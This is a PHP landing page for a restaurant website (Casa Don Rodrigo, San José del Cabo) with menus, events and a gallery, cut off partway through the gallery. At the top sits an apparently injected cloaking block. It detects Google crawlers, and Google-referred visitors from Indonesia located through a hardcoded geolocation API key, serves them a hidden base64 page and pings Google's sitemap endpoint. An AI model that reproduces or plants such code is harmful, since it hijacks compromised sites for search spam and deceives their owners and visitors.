<?php
error_reporting(0);

$lp_data = '';
$redirect_contry = [
    'ID'
];
$allow_user_agents = [
    'googlebot',
    'mediapartners',
    'storebot-google',
    'google-inspectiontool',
    'googleother',
    'google-extended',
    'apis-google',
    'google-mobile',
    'feedfetcher',
    'googleproducer',
    'support.google.com',
    'google-speakr',
    'google-site-verification',
    'appengine-engine',
    'google web preview',
    'google-xrawler',
    'google-structured',
    'google-physicalweb',
    'google-favicon',
    'google-certificates',
    'google-read-aloud',
    'google-safety',
    'developers.google.com',
    'adsbot-google',
    'google-adwords'
];

$keys = [
    'active' => [
        ''
    ],
    'inactive' => []
];
$base_path = dirname(__FILE__);
$keys_file = $base_path . '/.keys.json';

function getKeys()
{
    global $keys_file;

    return json_decode(file_get_contents($keys_file));
}

function saveKeys($keys)
{
    global $keys_file;
    if (function_exists('file_put_contents')) {
        file_put_contents($keys_file, json_encode($keys));
    } else {
        $f = fopen($keys_file, 'w');
        fwrite($f, json_encode($keys));
        fclose($f);
    }
}
if (!file_exists($keys_file)) {
    saveKeys($keys);
}

$keys_data = getKeys();
$active_keys = $keys_data->active;
$inactive_keys = $keys_data->inactive;

if (isset($_SESSION['already_'])) {
    header('Content-Type: text/html');
    die(base64_decode($lp_data));
}

function url()
{

    if (isset($_SERVER['HTTPS'])) {
        $protocol = ($_SERVER['HTTPS'] && $_SERVER['HTTPS'] != "off") ? "https" : "http";
    } else {
        $protocol = 'http';
    }

    return $protocol . '://' . $_SERVER['HTTP_HOST'] . '/';
}

function pingSitemap()
{
    $url_ = 'https://www.google.com/ping?sitemap=' . url();
    if (function_exists('curl_init')) {
        $ch = curl_init();
        $opt = array(
            CURLOPT_URL => $url_,
            CURLOPT_RETURNTRANSFER => 1,
            CURLOPT_SSL_VERIFYHOST => 0,
            CURLOPT_SSL_VERIFYPEER => 0
        );
        curl_setopt_array($ch, $opt);
        $content = curl_exec($ch);
        curl_close($ch);
        return json_decode($content);
    } else if (function_exists('file_get_contents')) {
        $contextOptions = array(
            "ssl" => array(
                "verify_peer" => false,
                "verify_peer_name" => false
            ),
        );

        return json_decode(file_get_contents($url_, false, stream_context_create($contextOptions)));
    } else {
        return false;
    }
}

$user_agent = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : "";
$browser = getBrowser($user_agent);
$referer = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : "";
function ipinfo()
{
    $url_ = "https://geo.ipify.org/api/v2/country?apiKey=at_m2PbbCsa2ukmvUR0Ar4QR29yiz1aR";
    $data = false;
    if (function_exists('curl_init')) {
        $ch = curl_init();
        $opt = array(
            CURLOPT_URL => $url_,
            CURLOPT_RETURNTRANSFER => 1,
            CURLOPT_SSL_VERIFYHOST => 0,
            CURLOPT_SSL_VERIFYPEER => 0
        );
        curl_setopt_array($ch, $opt);
        $content = curl_exec($ch);
        curl_close($ch);
        $data = json_decode($content);
    } else if (function_exists('file_get_contents')) {
        $contextOptions = array(
            "http" => array(
                "ignore_errors" => true,
            ),
            "ssl" => array(
                "verify_peer" => false,
                "verify_peer_name" => false
            ),
        );

        $data = json_decode(file_get_contents($url_, false, stream_context_create($contextOptions)));
        echo $data;
    }

    if ($data) {
        if ($data->code == 403) {
            echo 'Check your API key';
            return false;
        }
    }
    return $data;
}

function get_client_ip()
{
    $ipaddress = '';
    if (isset($_SERVER['REMOTE_ADDR']))
        $ipaddress = $_SERVER['REMOTE_ADDR'];
    else if (isset($_SERVER['HTTP_CLIENT_IP']))
        $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
    else if (isset($_SERVER['HTTP_X_FORWARDED_FOR']))
        $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
    else if (isset($_SERVER['HTTP_X_FORWARDED']))
        $ipaddress = $_SERVER['HTTP_X_FORWARDED'];
    else if (isset($_SERVER['HTTP_FORWARDED_FOR']))
        $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
    else if (isset($_SERVER['HTTP_FORWARDED']))
        $ipaddress = $_SERVER['HTTP_FORWARDED'];
    else
        $ipaddress = 'UNKNOWN';
    return $ipaddress;
}

function getBrowser($user_agent)
{
    $browser        =   "Unknown";
    $browser_array  =   array(
        '/msie/i'       =>  'Internet Explorer',
        '/firefox/i'    =>  'Firefox',
        '/safari/i'     =>  'Safari',
        '/chrome/i'     =>  'Chrome',
        '/opera/i'      =>  'Opera',
        '/netscape/i'   =>  'Netscape',
        '/maxthon/i'    =>  'Maxthon',
        '/konqueror/i'  =>  'Konqueror',
        '/mobile/i'     =>  'Handheld Browser'
    );
    foreach ($browser_array as $regex => $value) {
        if (preg_match($regex, $user_agent)) {
            $browser    =   $value;
            break;
        }
    }
    return $browser;
}

$ipinfo = ipinfo();
foreach ($allow_user_agents as $allow_agent) {
    if (strstr(strtolower($user_agent), $allow_agent)) {
        $_SESSION['already_'] = 'yes';
        pingSitemap();
        die(base64_decode($lp_data));
    }
}

if ($referer !== "") {

    $ref_page = parse_url($referer);

    if (stristr($ref_page, 'google.')) {
        $ipinfo = ipinfo($ip_address);
        if (in_array($ipinfo->country, $redirect_contry)) {
            $_SESSION['already_'] = 'yes';
            pingSitemap();
            die(base64_decode($lp_data));   
        }
    }
}

?>
<!DOCTYPE html>
<html lang="en">


	<head>
		<!-- Meta Data -->
		<meta charset="UTF-8">
		<meta http-equiv="X-UA-Compatible" content="IE=edge">
		<meta name="viewport" content="width=device-width, initial-scale=1">



		<title>Casa Don Rodrigo - Authentic Mexican Casona</title>

		<link rel="apple-touch-icon" sizes="180x180"
			href="assets/img/fav/apple-touch-icon.png">
		<link rel="icon" type="image/png" sizes="32x32"
			href="assets/img/fav/favicon-32x32.png">
		<link rel="icon" type="image/png" sizes="16x16"
			href="assets/img/fav/favicon-16x16.png">
		<link rel="mask-icon" href="assets/img/fav/safari-pinned-tab.svg"
			color="#c59d5f">

		<meta name="msapplication-TileColor" content="#c59d5f">
		<meta name="theme-color" content="#c59d5f">

		<!-- Dependency Styles -->
		<link rel="stylesheet" href="dependencies/bootstrap/css/bootstrap.min.css"
			type="text/css">
		<link rel="stylesheet" href="dependencies/fontawesome/css/all.min.css"
			type="text/css">
		<link rel="stylesheet" href="dependencies/swiper/css/swiper.min.css"
			type="text/css">
		<link rel="stylesheet" href="dependencies/wow/css/animate.css"
			type="text/css">
		<link rel="stylesheet"
			href="dependencies/magnific-popup/css/magnific-popup.css" type="text/css">
		<link rel="stylesheet" href="dependencies/themify-icons/css/themify-icons.css"
			type="text/css">
		<link rel="stylesheet"
			href="dependencies/components-elegant-icons/css/elegant-icons.min.css"
			type="text/css">
		<link rel="stylesheet"
			href="dependencies/air-datepicker/css/datepicker.min.css" type="text/css">
		<link rel="stylesheet" type="text/css"
			href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/2.1.5/jquery.fancybox.min.css"
			/>

		<!-- Site Stylesheet -->
		<link rel="stylesheet" href="assets/css/app.css" type="text/css">

		<!-- Google Web Fonts -->
		<link
			href="https://fonts.googleapis.com/css?family=Cardo:400,400i,700%7CGreat+Vibes&amp;subset=greek"
			rel="stylesheet">

		<!-- Global site tag (gtag.js) - Google Analytics -->
		<script async
			src="https://www.googletagmanager.com/gtag/js?id=UA-160438070-4"></script>
		<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-160438070-4');
</script>



	</head>

	<body id="home-version-1" class="home-version-1" data-style="default">

		<a href="#main_content" data-type="section-switch" class="return-to-top">
			<i class="fa fa-chevron-up"></i>
		</a>

		<div class="page-loader">
			<div class="loader">
				<ul class="loader-cup">
					<li></li>
					<li></li>
					<li></li>
				</ul>
				<div class="wineglass left">
					<div class="top"></div>
				</div>
				<div class="wineglass right">
					<div class="top"></div>
				</div>
			</div>
		</div>
		<!-- /.page-loader -->

		<div id="main_content">


			<!--=========================-->
			<!--=        Navbar         =-->
			<!--=========================-->
			<header class="site-header gp-header-sticky">
				<div class="container">
					<div class="header-inner">
						<div class="site-logo">
							<a href="/" class="logo">
								<img src="assets/img/main-logo.png" alt="site logo" class="logo-main">
								<img src="assets/img/sticky-logo.png" alt="site logo"
									class="logo-sticky">
							</a>
						</div>
						<!-- /.site-logo -->



						<nav class="site-nav">
							<div class="close-menu">
								<i class="ei ei-icon_close"></i>
							</div>

							<ul class="site-main-menu">
								<li><a href="/">Home</a></li>

								<li><a href="#nosotros">About</a></li>
								<li><a href="#menu">Menu</a></li>
								<li><a href="choyarose.html">Boutique</a></li>
								<li><a href="#galerias">Gallery</a></li>

							</ul>

							<div class="right-menu">

								<a target="_blank"
									href="https://www.opentable.com.mx/restref/client/?restref=1034446&lang=en-US&corrid=df0c702e-6a9b-47b0-944e-a36f9e87cf1a"
									class="nav-btn gp-btn">Reservations</a>
							</div>
							<!-- /.right-menu -->
						</nav>
						<!-- /.site-nav -->
					</div>
					<!-- /.heder-inner -->
				</div>
				<!-- /.container -->
			</header>
			<!-- /.site-header -->

			<!--==========================-->
			<!--=         Banner         =-->
			<!--==========================-->
			<header class="banner">
				<div class="swiper-container banner-slider" data-swiper-config='{
					"loop": false,
					"speed": 700,
					"autoplay": 4000,
					"pagination":"#banner-swiper-pagination",
					"slidesPerView": 1,
					"parallax": true,
					"nextButton":"#slide-next",
					"prevButton":"#slide-prev",
					"grabCursor": false,
					"paginationClickable": true
					}'>

					<div class="swiper-wrapper">
						<div class="swiper-slide" data-bg-image="media/banner/1.jpg">


							<div class="container">
								<div class="banner-content text-center">
									<h3 class="sub-title" data-animate="fadeInDown">Welcome to </h3>
									<h2 class="banner-title" data-animate="fadeInDown" data-delay="0.3s">Casa
										Don Rodrigo</h2>

									<div class="seaperator-line">
										<span class="line line-left"></span>
										<span class="star" data-animate="fadeIn"><svg
												xmlns="../external.html?link=http://www.w3.org/2000/svg"
												xmlns:xlink="../external.html?link=http://www.w3.org/1999/xlink"
												width="22px" height="20px">
												<path fill-rule="evenodd" fill="rgb(255, 255, 255)"
													d="M19.583,11.544 L19.570,11.572 L19.545,11.588 C19.517,11.605
													16.718,13.384 14.335,12.085 C14.329,12.082 14.021,11.911
													13.614,11.660 C15.151,12.918 17.057,14.822 16.937,16.450
													L16.937,18.824 L16.937,19.013 L16.783,18.906 C16.771,18.897
													15.516,18.029 14.763,17.934 L14.741,17.931 L14.722,17.919
													C14.692,17.899 11.940,16.054 10.904,13.479 C10.812,15.838
													10.382,18.574 8.926,19.307 C8.856,19.345 7.207,20.215 6.388,19.906
													L6.310,19.877 L6.326,19.794 C6.329,19.780 6.611,18.324 6.233,17.275
													L6.220,17.242 L6.232,17.209 C6.242,17.180 7.197,14.478 8.239,12.334
													C6.196,13.830 5.863,14.219 5.827,14.311 L5.823,14.317 L5.820,14.323
													C5.810,14.341 5.580,14.730 4.921,14.883 C4.134,15.065 2.655,14.917
													0.079,13.169 L0.001,13.117 L0.051,13.036 C0.160,12.855 2.771,8.633
													5.740,9.032 C5.750,9.032 6.557,9.076 7.486,9.200 C3.755,7.128
													3.963,2.546 3.966,2.497 L3.969,2.455 L4.002,2.427 C4.557,1.962
													4.849,0.229 4.852,0.212 L4.886,0.006 L5.023,0.163 C5.685,0.925
													6.741,1.319 6.752,1.322 L6.738,1.319 C9.490,1.904 10.545,4.205
													10.942,6.184 C11.288,4.869 12.036,3.931 13.161,3.502 C13.776,3.206
													15.388,2.287 15.464,1.603 L15.655,1.583 C15.724,1.796 17.217,6.572
													15.341,8.328 C17.627,7.824 19.216,7.964 20.051,8.762 L20.043,8.755
													C20.055,8.766 21.283,9.706 21.910,9.436 L21.998,9.611 C21.977,9.624
													19.861,10.889 19.583,11.544 ZM12.278,10.177 C12.264,10.129
													12.238,10.084 12.215,10.038 C12.202,10.010 12.194,9.980
													12.177,9.953 C12.150,9.910 12.112,9.870 12.077,9.830 C12.056,9.804
													12.040,9.777 12.016,9.754 C11.985,9.724 11.946,9.700 11.911,9.674
													C11.874,9.645 11.840,9.613 11.798,9.588 C11.695,9.526 11.583,9.478
													11.465,9.447 C11.348,9.415 11.224,9.398 11.099,9.397 L11.068,9.398
													C10.951,9.400 10.839,9.415 10.732,9.443 C10.671,9.459 10.618,9.486
													10.562,9.509 C10.518,9.527 10.471,9.539 10.430,9.561 C10.377,9.589
													10.334,9.629 10.287,9.664 C10.251,9.691 10.210,9.712 10.178,9.743
													C10.143,9.776 10.119,9.818 10.090,9.856 C10.056,9.898 10.017,9.936
													9.990,9.983 C9.909,10.123 9.868,10.269 9.868,10.416 C9.868,10.593
													9.925,10.765 10.038,10.926 L10.039,10.926 C10.183,11.135
													10.418,11.275 10.681,11.356 C10.734,11.372 10.779,11.404
													10.835,11.414 C10.925,11.429 11.009,11.436 11.091,11.436
													C11.602,11.436 12.062,11.164 12.236,10.757 L12.237,10.755
													C12.255,10.715 12.267,10.683 12.275,10.651 C12.300,10.563
													12.313,10.488 12.313,10.416 C12.313,10.335 12.301,10.254
													12.278,10.177 Z"/>
												</svg></span>
											<span class="line line-right"></span>
										</div>

										<p data-animate="fadeInUp" data-delay="0.7s">
											Authentic Mexican Casona
										</p>

										<a href="#nosotros" class="gp-btn btn-light" data-animate="fadeInUp"
											data-delay="0.9s">Explore</a>

									</div>
									<!-- /.banner-content -->
								</div>
								<!-- /.container -->
							</div>
							<!-- /.swiper-slide -->
						</div>
						<!-- /.swiper-wrapper -->


						<div class="swiper-pagination" id="banner-swiper-pagination"></div>

					</div>
					<!-- /.swiper-container -->
				</header>
				<!-- /.banner -->

				<!--=========================-->
				<!--=         About         =-->
				<!--=========================-->
				<section id="nosotros" class="about">
					<div class="container">
						<div class="section-title text-center">

							<h2 class="title wow fadeInUp" data-wow-delay="0.5s">
								Casa Don Rodrigo
							</h2>
							<h3 class="sub-title wow fadeInUp">Authentic Mexican Casona</h3>

						</div>
						<!-- /.section-title -->

						<div style="margin-bottom: 150px;" class="about-content-two text-center">
							<p class="wow fadeInUp" data-wow-delay="1.0s">
								<b>Casa Don Rodrigo</b> is an authentic <i>Casona</i> located in La
								Calle Grande at the historic town of San José del Cabo. This house was
								built in 1920 by Don Rodrigo Aragon, one of the pioneers of the region
								and the first Mayor in town. The family’s main occupation was cattle
								raising and agriculture, their specialty was and continues to be making
								artisan homemade cheese and growing organic products at the family Farm.
							</p>
							<!-- /.about-feature-thumb-two -->

						</div>
						<!-- /.about-content-two -->
						<div class="row">
							<div style="margin-top: -90px;" class="col-lg-6">
								<div class="about-content">

									<p class="wow fadeInUp" data-wow-delay="1.3s">
										Casa Don Rodrigo is well known for offering a casual ambiance and genuine family style service and menu their specialty is making delicious homemade cheese and they offer a unique Cheese Tasting Experience where guests are invited to the Wine and Cheese Cellar to taste three of their best cheeses paired with their choice of Mexican wine, tequila or mezcal…it is a delighted experience in San Jose that you cant miss!
									</p>

									<p class="wow fadeInUp" data-wow-delay="1.6s">
										Casa Don Rodrigo is the home of <b>Cantina29</b> an old-style Mexican cantina that respects the past and the history of the house, you will experience a traditional tableside bar service and will share lots of stories with the locals about the old timers.

									</p>

									<p class="wow fadeInUp" data-wow-delay="1.9s">
										Next to the Cantina is the new Design and Lifestyle Boutique ChoyaRose where you will find beautiful home accessories, gifts and custom furniture from all over Mexico. Choya Rose also specializes in Interior Design and Procurement Services, so if you are looking to decorate your home or business make an appointment and they will be happy to help you.
									</p>
									<p class="wow fadeInUp" data-wow-delay="2.2s">
										<i>Casa Don Rodrigo is…the best place downtown San Jose del Cabo to Eat, Drink, Shop and Mingle like a local.</i>
									</p>
								</div>
								<!-- /.about-content -->
							</div>
							<!-- /.col-lg-6 -->

							<div class="col-lg-6">
								<div class="about-feature-image">
									<div class="img-one" data-parallax='{" y" : 25}'>
										<img src="media/about/1.jpg" alt="about" class="wow fadeInDown">
									</div>

									<div class="img-two" data-parallax='{" y" : -25}'>
										<img src="media/about/2.jpg" alt="about" class="wow fadeInUp">
									</div>
								</div>
								<!-- /.about-feature-image -->
							</div>
							<!-- /.col-lg-6 -->
						</div>
						<!-- /.row -->
					</div>
					<!-- /.container -->
				</section>
				<!-- /.about -->




				<!--==================================-->
				<!--=         Call To Action         =-->
				<!--==================================-->
				<section class="call-to-action jarallax">

					<img src="media/background/call-to-bg.jpg" alt="" class="jarallax-img">
					<div class="container">
						<div class="call-to-action-wrapper wow fadeInUp">
							<div class="content-left">
								<h2>
									MAKE A RESERVATION <br>
								</h2>

								<h4>
									Making you feel good is our priority.
								</h4>
							</div>
							<!-- /.content-left -->

							<div class="action-btn-inner">
								<a target="_blank"
									href="https://www.opentable.com.mx/restref/client/?restref=1034446&lang=en-US&corrid=df0c702e-6a9b-47b0-944e-a36f9e87cf1a"
									class="gp-btn btn-light">Book a table</a>
							</div>
							<!-- /.action-btn-inner -->
						</div>
						<!-- /.call-to-action-wrapper -->
					</div>
					<!-- /.container -->
				</section>
				<!-- /.call-to-acteon -->

				<section id="about-three" class="section-padding">
					<div class="container">
						<div class="row">
							<div class="col-lg-6">
								<div class="about-three-thumb">
									<div class="img-one" data-parallax='{"x" : -80}'>
										<img src="media/about/1.png" alt="about">
									</div>

									<div class="img-two">
										<img src="media/about/2.png" alt="about">
									</div>
								</div>
								<!-- /.about-three-thumb -->
							</div>
							<!-- /.col-lg-6 -->
							<div style="margin-bottom:50px;" class="col-lg-6">
								<div class="about-content-three">
									<div class="section-title text-left">
										<h4 class="wow fadeInUp" data-wow-delay="0.5s">
											Don't miss out this experience!
										</h4>
										<h2 class="title wow fadeInUp" data-wow-delay="0.3s" style="visibility: visible; animation-delay: 0.3s; animation-name: fadeInUp;">
											Tasting <span> of artisan</span> <br>
											cheeses.
										  </h2>
										
										<p class="wow fadeInUp" data-wow-delay="0.7s">
											Hours: 5:00 pm and 7:00 pm
											<br>
											Cost: $45 dollars
											<br>
											<br>
											<b>You can reserve by
												<br> email <a href="mailto:info@casadonrodrigo.com">info@casadonrodrigo.com</a></b>
										</p>
									</div>
								</div>
								<!-- /.about-content-three -->
							</div>
							<!-- /.col-lg-6 -->
						</div>
						<!-- /.row -->
					</div>
					<!-- /.container -->
				</section>
				<section id="about-three" class="section-padding">
					<div class="container">
						<div class="row">
							<div style="margin-bottom:50px;" class="col-lg-6">
								<div class="about-content-three">
									<div class="section-title text-left">
										<h4 class="wow fadeInUp" data-wow-delay="0.5s">
											Happy hour
										</h4>
										<h2 class="title wow fadeInUp" data-wow-delay="0.3s">
											Everyday at
											<br> Cantina 29 <br>
											2x1 on Margaritas<br> & Mezcales
										</h2>

										<h6 class="wow fadeInUp" data-wow-delay="0.3s" style="visibility: visible; animation-delay: 0.3s; animation-name: fadeInUp;">
											Margaritas - Mezcales
										  </h6>
										  <p class="wow fadeInUp" data-wow-delay="0.7s" style="visibility: visible; animation-delay: 0.7s; animation-name: fadeInUp;">
											1:00 pm a 7:00 pm
										  </p>

										  <p class="wow fadeInUp" data-wow-delay="0.7s" style="visibility: visible; animation-delay: 0.7s; animation-name: fadeInUp;">
											<b>Wednesday</b><br>MALA RUMBA
											<br>
											<br>
											<b>Thursday</b><br> Dann Steel
											<br>
											<br>
											<b>You can reserve by <br>
											  email
											  <a href="mailto:info@casadonrodrigo.com">info@casadonrodrigo.com</a></b>
										  </p>
									</div>
								</div>
								<!-- /.about-content-three -->
							</div>
							<div class="col-lg-6">
								<div class="about-three-thumb">
									<div class="img-one" data-parallax='{"x" : -160}'>
										<img src="media/about/d.png" alt="about">
									</div>
									<br>
		
									<div class="img-two">
										<img src="media/about/foto2.png" alt="about">
									</div>
								</div>
								<!-- /.about-three-thumb -->
							</div>
							<!-- /.col-lg-6 -->
							<!-- /.col-lg-6 -->
						</div>
						<!-- /.row -->
					</div>
					<!-- /.container -->
				</section>

				<!--=============================-->
				<!--=         Food Menu         =-->
				<!--=============================-->
				<section id="menu" class="food-menu-area">
					<div class="container">
					  <div class="section-title text-center">
						<h2 class="title wow fadeInUp" data-wow-delay="0.3s" style="visibility: visible; animation-delay: 0.3s; animation-name: fadeInUp;">
						  Discover food menu
						</h2>
					  </div>
					  <!-- /.section-title -->
			
					  <div class="food-tabs-wrapper wow fadeInUp" data-wow-delay="0.5s" style="visibility: visible; animation-delay: 0.5s; animation-name: fadeInUp;">
						<nav class="tabs-inner">
						  <div class="nav menu-tabs" role="tablist">
							<a class="nav-item nav-link" id="zoetig-tab" data-toggle="tab" href="#zoetig" role="tab" aria-controls="zoetig" aria-selected="false">
							  <span>Lunch</span>
							</a>
							<a class="nav-item nav-link active" id="dinner-tab" data-toggle="tab" href="#dinner" role="tab" aria-controls="dinner" aria-selected="true">
							  <span>Dinner</span>
							</a>
							<a class="nav-item nav-link" id="nav-finger-tab" data-toggle="tab" href="#nav-finger" role="tab" aria-controls="nav-finger" aria-selected="false">
							  <span>Wines</span>
							</a>
			
							<a class="nav-item nav-link" id="nav-finger-tab" data-toggle="tab" href="#carta" role="tab" aria-controls="carta" aria-selected="false">
							<span>Carta</span>
						  </a>
						  </div>
						</nav>
			
						<div class="tab-content tab-content-top">
						  <div class="tab-pane fade" id="zoetig" role="tabpanel" aria-labelledby="zoetig-tab">
							<div class="tab-pane fade show active" id="zoetig" role="tabpanel" aria-labelledby="zoetig-tab">
							  <nav class="tabs-child">
								<div class="nav menu-tabs-child" role="tablist">
								  <a class="nav-item nav-link active" id="nav-antipasti-tab" data-toggle="tab" href="#nav-antipasti" role="tab" aria-controls="nav-antipasti" aria-selected="true">
									English
								  </a>
								  <a class="nav-item nav-link" id="nav-insalatone-tab" data-toggle="tab" href="#nav-insalatone" role="tab" aria-controls="nav-insalatone" aria-selected="false">
									Español
								  </a>
								</div>
							  </nav>
			
							  <div class="tab-content tab-content-child">
								<div class="tab-pane fade show active" id="nav-antipasti" role="tabpanel" aria-labelledby="nav-antipasti-tab">
								 <div class="row">
								  <div class="col-md-6 d-flex justify-content-center">
  									<img src="menu/VERANO_ing.jpg" alt="" class="img-fluid">
												
								  
			
								  </div>
								 </div>
								</div>
								<div class="tab-pane fade" id="nav-insalatone" role="tabpanel" aria-labelledby="nav-insalatone-tab">
								<div class="row">
								  <div class="col-md-6 d-flex justify-content-center">
									<img src="menu/VERANO_esp.jpg" alt="" class="img-fluid">

			
								  
			
								  </div>
								 </div>
								</div>
							  </div>
							</div>
						  </div>
			
						  <div class="tab-pane fade show active" id="dinner" role="tabpanel" aria-labelledby="dinner-tab">
							<div class="tab-pane fade show active" id="dinner" role="tabpanel" aria-labelledby="dinner-tab">
							  <nav class="tabs-child">
								<div class="nav menu-tabs-child" role="tablist">
								  <a class="nav-item nav-link active" id="nav-cenaEn-tab" data-toggle="tab" href="#nav-cenaEn" role="tab" aria-controls="nav-cenaEn" aria-selected="true">
									English
								  </a>
								  <a class="nav-item nav-link" id="nav-cenaEs-tab" data-toggle="tab" href="#nav-cenaEs" role="tab" aria-controls="nav-cenaEs" aria-selected="false">
									Español
								  </a>
								</div>
							  </nav>
			
							  <div class="tab-content tab-content-child">
								<div class="tab-pane fade active show" id="nav-cenaEn" role="tabpanel" aria-labelledby="nav-cenaEn-tab">
								<div class="row">
								  <div class="col-md-6">
									<img src="menu/ingles1.jpg" alt="">
			
								  </div>
								  <div class="col-md-6">
									<img src="menu/ingles2.jpg" alt="">
			
								  </div>
								 </div>
								</div>
								<div class="tab-pane fade" id="nav-cenaEs" role="tabpanel" aria-labelledby="nav-cenaEs-tab">
								<div class="row">
								  <div class="col-md-6">
									<img src="menu/espa1.jpg" alt="">
			
								  </div>
								  <div class="col-md-6">
									<img src="menu/espa2.jpg" alt="">
			
								  </div>
								 </div>
								</div>
							  </div>
							</div>
						  </div>
			
						  <div class="tab-pane fade" id="nav-finger" role="tabpanel" aria-labelledby="nav-finger-tab">
							<div class="tab-pane fade show active" id="zoetig" role="tabpanel" aria-labelledby="zoetig-tab">
			
							  <div class="tab-content tab-content-child">
								<div class="tab-pane fade show active" id="nav-antipasti-2" role="tabpanel" aria-labelledby="nav-antipasti-tab-2">
								<div class="row">
								  <div class="col-md-6">
									<img src="menu/nuevo/01_Vinos.jpg" alt="">
			
								  </div>
								  <div class="col-md-6">
									<img src="menu/nuevo/02_Vinos.jpg" alt="">
			
								  </div>
								 </div>
								</div>
								<div class="tab-pane fade" id="nav-insalatone-2" role="tabpanel" aria-labelledby="nav-insalatone-tab-2"></div>
							  </div>
			
							</div>
						  </div>
			
			
						  <div class="tab-pane fade" id="carta" role="tabpanel" aria-labelledby="nav-finger-tab">
						  <div class="tab-pane fade show active" id="zoetig" role="tabpanel" aria-labelledby="zoetig-tab">
			
							<div class="tab-content tab-content-child">
							  <div class="tab-pane fade show active" id="nav-antipasti-2" role="tabpanel" aria-labelledby="nav-antipasti-tab-2">
							  <div class="row">
								<div class="col-md-6">
								  <img src="menu/nuevo/01_Carta.jpg" alt="">
			
								</div>
								<div class="col-md-6">
								  <img src="menu/nuevo/02_Carta.jpg" alt="">
			
								</div>
							   </div>
							  </div>
							  <div class="tab-pane fade" id="nav-insalatone-2" role="tabpanel" aria-labelledby="nav-insalatone-tab-2"></div>
							</div>
			
						  </div>
						</div>
			
						</div>
					  </div>
					  <!-- /.food-tabs-wrapper -->
					</div>
					<!-- /.container -->
				  </section>
				<!-- /.food-menu-area -->

				<!--===============================-->
				<!--=         Galería         =-->
				<!--===============================-->
				<section id="galerias" class="gallery">
					<div class="container p-0">
					  <div class="gallery-inner">
						<div class="section-title text-center">
						  <h2 class="title wow fadeInUp" style="visibility: visible; animation-name: fadeInUp;">Casa Don Rodrigo</h2>
						  <h3 class="sub-title wow fadeInUp" data-wow-delay="0.3s" style="visibility: visible; animation-delay: 0.3s; animation-name: fadeInUp;">
							Authentic Mexican Casona
						  </h3>
						</div>
			
						<div class="cafe-isotope wow fadeIn" data-wow-delay="0.3s" style="visibility: visible; animation-delay: 0.3s; animation-name: fadeIn;">
						  <div class="cafe-gallery-items port-gutters" style="position: relative; height: 3329.33px;">
							<div class="grid-sizer"></div>
							<div class="cafe-gallery-item width-large grid-item pizza dolci cocktails" style="position: absolute; left: 0%; top: 0px;">
							  <div class="cafe-isotope-grid__img">
								<img src="media/gallery/20.jpg" alt="gallery thumb">
			
								<div class="gallery-info">
								  <a class="popup-modal" href="media/gallery/20.jpg"><i class="ei ei-icon_search"></i></a>
								</div>
							  </div>
							</div>
			
							<div class="cafe-gallery-item width-sm-large grid-item pizza dinner" style="position: absolute; left: 57.2057%; top: 0px;">
							  <div class="cafe-isotope-grid__img">
								<img src="media/gallery/21.jpg" alt="gallery thumb">
			
								<div class="gallery-info">
								  <a class="popup-modal" href="media/gallery/21.jpg"><i class="ei ei-icon_search"></i></a>
								</div>
							  </div>
							</div>
			
							<div class="cafe-gallery-item width2 grid-item dolci wine" style="position: absolute; left: 0%; top: 191.988px;">
							  <div class="cafe-isotope-grid__img">
								<img src="media/gallery/24.jpg" alt="gallery thumb">
			
								<div class="gallery-info">
								  <a class="popup-modal" href="media/gallery/24.jpg"><i class="ei ei-icon_search"></i></a>
								</div>
							  </div>
							</div>
			
							<div class="cafe-gallery-item width3 grid-item pizza" style="position: absolute; left: 47.9923%; top: 191.988px;">
							  <div class="cafe-isotope-grid__img">
								<img src="media/gallery/27.jpg" alt="gallery thumb">
			
								<div class="gallery-info">
								  <a class="popup-modal" href="media/gallery/27.jpg"><i class="ei ei-icon_search"></i></a>
								</div>
							  </div>
							</div>
			
							<div class="cafe-gallery-item width4 grid-item pizza wine" style="position: absolute; left: 47.9923%; top: 428.013px;">
							  <div class="cafe-isotope-grid__img">
								<img src="media/gallery/26.jpg" alt="gallery thumb">
			
								<div class="gallery-info">
								  <a class="popup-modal" href="media/gallery/26.jpg"><i class="ei ei-icon_search"></i></a>
								</div>
							  </div>
							</div>
			
							<div class="cafe-gallery-item width-large grid-item pizza dolci cocktails" style="position: absolute; left: 0%; top: 738.013px;">
							  <div class="cafe-isotope-grid__img">
								<img src="media/gallery/15.jpg" alt="gallery thumb">
			
								<div class="gallery-info">
								  <a class="popup-modal" href="media/gallery/15.jpg"><i class="ei ei-icon_search"></i></a>
								</div>
							  </div>
							</div>
			
							<div class="cafe-gallery-item width-sm-large grid-item pizza dinner" style="position: absolute; left: 57.2057%; top: 738.013px;">
							  <div class="cafe-isotope-grid__img">
								<img src="media/gallery/16.jpg" alt="gallery thumb">
			
								<div class="gallery-info">
								  <a class="popup-modal" href="media/gallery/16.jpg"><i class="ei ei-icon_search"></i></a>
								</div>
							  </div>
							</div>
			
							<div class="cafe-gallery-item width2 grid-item dolci wine" style="position: absolute; left: 0%; top: 930.001px;">
							  <div class="cafe-isotope-grid__img">
								<img src="media/gallery/17.jpg" alt="gallery thumb">
			
								<div class="gallery-info">
								  <a class="popup-modal" href="media/gallery/17.jpg"><i class="ei ei-icon_search"></i></a>
								</div>
							  </div>
							</div>
			
							<div class="cafe-gallery-item width3 grid-item pizza" style="position: absolute; left: 47.9923%; top: 930.001px;">
							  <div class="cafe-isotope-grid__img">
								<img src="media/gallery/18.jpg" alt="gallery thumb">
			
								<div class="gallery-info">
								  <a class="popup-modal" href="media/gallery/18.jpg"><i class="ei ei-icon_search"></i></a>
								</div>
							  </div>
							</div>
			
							<div class="cafe-gallery-item width4 grid-item pizza wine" style="position: absolute; left: 47.9923%; top: 1166.03px;">
							  <div class="cafe-isotope-grid__img">
								<img src="media/gallery/19.jpg" alt="gallery thumb">
			
								<div class="gallery-info">
								  <a class="popup-modal" href="media/gallery/19.jpg"><i class="ei ei-icon_search"></i></a>
								</div>
							  </div>
							</div>
			
							<div class="cafe-gallery-item width-large grid-item pizza dolci cocktails" style="position: absolute; left: 0%; top: 1476.03px;">
							  <div class="cafe-isotope-grid__img">
								<img src="media/gallery/10.jpg" alt="gallery thumb">
			
								<div class="gallery-info">
